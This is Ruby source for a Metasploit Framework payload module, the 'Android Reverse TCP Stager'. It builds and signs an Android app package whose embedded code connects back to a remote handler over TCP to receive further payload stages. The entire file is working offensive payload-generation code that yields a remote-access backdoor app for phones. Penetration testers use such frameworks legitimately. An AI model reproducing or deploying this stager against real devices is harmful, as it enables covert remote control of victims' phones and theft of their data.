##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit-payloads'
require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/transport_config'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::TransportConfig
  include Msf::Payload::Android
  include Msf::Payload::UUID::Options

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Android Reverse TCP Stager',
      'Description' => 'Connect back stager',
      'Author'      => ['timwr', 'OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'android',
      'Arch'        => ARCH_DALVIK,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Stager'      => {'Payload' => ''}
    ))
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  def generate_jar(opts={})
    jar = Rex::Zip::Jar.new

    classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
    apply_options(classes, opts, payload_uri)

    jar.add_file("classes.dex", fix_dex_header(classes))

    files = [
      [ "AndroidManifest.xml" ],
      [ "resources.arsc" ]
    ]

    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
    jar.build_manifest

    cert, key = generate_cert
    jar.sign(key, cert, [cert])

    jar
  end

end
